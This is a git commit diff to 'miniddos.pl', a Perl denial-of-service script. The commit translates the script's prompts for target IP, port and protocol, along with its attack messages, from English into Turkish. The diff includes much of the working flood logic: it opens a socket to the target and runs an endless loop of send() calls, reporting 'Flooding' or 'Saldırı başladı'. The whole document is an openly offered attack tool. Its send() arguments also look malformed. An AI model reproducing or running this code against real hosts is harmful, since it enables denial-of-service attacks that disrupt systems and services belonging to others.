909973cc45db0a57dacd54806cd1ee74d43981b2
SyberCodeV1 <65829832+sybercodev1real@users.noreply.github.com>
2020-09-14 15:50:29 +0300

    Update miniddos.pl

--- miniddos.pl
+++ miniddos.pl
@@ -31,31 +31,31 @@ if(!(defined $check && $check)){
 $check->close();
 # INPUT TARGET INFO ==============================================
 print "\n===============================";
-print "\n[~] Enter TargetIP: "; # Set Target IP
+print "\n[~] İp adresi: "; # Set Target IP
 $host = <STDIN>;
 chomp ($host);
 while ($host eq ""){
- print "   [!] Enter TargetIP?: ";
+ print "   [!] İp adresi yanlıs tekrar girin?: ";
  $host = <STDIN>;
  chomp ($host);
 }
 print "TRAGET ==> $host";
 print "\n===============================";
-print "\n[~] Enter Port: "; # Set Port
+print "\n[~] Port: "; # Set Port
 $port = <STDIN>;
 chomp ($port);
 while ($port eq "" || !looks_like_number($port) || !grep{$port eq $_}(0..65535)){ 
- print "   [!] Enter PORT?: ";       
+ print "   [!] Port adresini tekrar girin?: ";       
  $port = <STDIN>;
  chomp ($port); 
 } 
 print "PORT ==> $port";
 print "\n===============================";
-print "\n[~] Enter Protockol (TCP or UDP) :"; # Set Protockol;
+print "\n[~] Protokol? (TCP - UDP) :"; # Set Protockol;
 $proto = <STDIN>;
 chomp ($proto);
 while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
- print "   [!] Enter Protockol (TCP or UDP) ?: ";
+ print "   [!] Protokolu tekrar girin(TCP - UDP) ?: ";
  $proto = <STDIN>;
  chomp ($proto);
 }
@@ -68,17 +68,17 @@ $sock = IO::Socket::INET->new(
         PeerPort => $port,
         Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
 system("clear || cls");
-print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
+print "\n[*] Saldırı başladı![$host:$port] proto => [$proto].......\n\n";
 sleep(1);
 while (1) {
   if(grep{$proto eq $_} 'TCP','tcp'){
        $sock = IO::Socket::INET->new(
         PeerAddr => $host,
         PeerPort => $port,
-        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
+        Proto => "$proto" ) || die "\n[!] Bağlantı başarısız hedef[$host] port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
         for($i=0; $i<=500; $i++){
             $size = rand() * 8921873 * 99919988;
-            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
+            print ("saldırılıyor: (=>$host:$port~$proto<=) Packet yollandı: $size\n");
             send($sock, $size*2, $size*2); 
             send($sock, $size*3, $size*3);
             send($sock, $size*4, $size*4);
@@ -88,7 +88,7 @@ while (1) {
 
   }else{
             $size = rand() * 8921873 * 99919988;
-            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
+            print ("Flooding: (=>$host:$port~$proto<=) Packet yollandı: $size\n");
             send($sock, $size*2, $size*2); 
             send($sock, $size*3, $size*3);
             send($sock, $size*4, $size*4);
